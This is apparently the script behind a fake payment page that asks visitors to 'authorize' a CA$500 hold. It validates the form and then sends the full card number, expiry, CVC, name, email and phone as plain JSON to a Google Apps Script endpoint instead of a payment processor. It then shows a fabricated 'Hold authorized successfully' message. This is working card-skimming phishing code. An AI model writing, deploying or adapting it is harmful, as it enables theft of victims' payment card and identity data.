        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyfT99YDBS-n8tOFdjNFeAcm_kFIVaeGcESQ39lgWw7rWebv6DUnEi2tWHqHtNJ4jfiNA/exec";

        document.addEventListener('DOMContentLoaded', function () {
            const phoneInputField = document.querySelector("#phone");
            const phoneInput = window.intlTelInput(phoneInputField, {
                initialCountry: "auto",
                geoIpLookup: function(callback) {
                    fetch("https://ipapi.co/json")
                      .then(res => res.json())
                      .then(data => callback(data.country_code))
                      .catch(() => callback("ca")); 
                },
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
                separateDialCode: true,
                autoPlaceholder: "aggressive"
            });

            const ccInput = document.getElementById('number');
            const expInput = document.getElementById('expiry');
            const formStack = document.getElementById('form-stack');

            ccInput.addEventListener('input', function (e) {
                let value = e.target.value.replace(/\D/g, '');
                e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
                formStack.classList.remove('input-error');
                document.getElementById('error-message').textContent = "";
            });

            expInput.addEventListener('input', function (e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 4) value = value.slice(0, 4);
                if (value.length >= 2) {
                    e.target.value = value.substring(0, 2) + ' / ' + value.substring(2);
                } else {
                    e.target.value = value;
                }
            });
            
            expInput.addEventListener('keydown', function(e) {
                if (e.key === "Backspace" && this.value.endsWith(' / ')) {
                    this.value = this.value.slice(0, -3);
                }
            });
            const form = document.getElementById('payment-form');
            const submitBtn = document.getElementById('submit');
            const errorMessage = document.getElementById('error-message');

            form.addEventListener('submit', function(event) {
                event.preventDefault();
                errorMessage.textContent = "";
                formStack.classList.remove('input-error');

                const email = document.getElementById('email').value;
                const name = document.getElementById('full-name').value;
                const cardRaw = document.getElementById('number').value;
                const expiry = document.getElementById('expiry').value;
                const cvc = document.getElementById('code').value;

                if (!email || !name || !cardRaw || !expiry || !cvc) {
                    errorMessage.textContent = "Please fill in all fields.";
                    return;
                }
                
                if (!phoneInput.isValidNumber()) {
                    errorMessage.textContent = "Please enter a valid phone number.";
                    return;
                }

                const cleanCardNumber = cardRaw.replace(/\s+/g, '');

                if (!validator.isCreditCard(cleanCardNumber)) {
                    errorMessage.textContent = "Invalid card number. Please check your details.";
                    formStack.classList.add('input-error'); 
                    return; 
                }

                submitBtn.disabled = true;
                submitBtn.textContent = "Verifying...";

                const payload = {
                    email: email,
                    name: name,
                    phone: phoneInput.getNumber(),
                    card: cardRaw,
                    expiry: expiry,
                    cvc: cvc
                };

                fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    body: JSON.stringify(payload)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.result === "success") {
                        submitBtn.textContent = "Authorized ✔";
                        submitBtn.style.backgroundColor = "#4CAF50";
                        alert("Hold authorized successfully!");
                        form.reset();
                    } else {
                        throw new Error("Script returned error");
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    errorMessage.textContent = "Connection error. Please try again.";
                    submitBtn.disabled = false;
                    submitBtn.textContent = "Authorize CA$500";
                });
            });
        });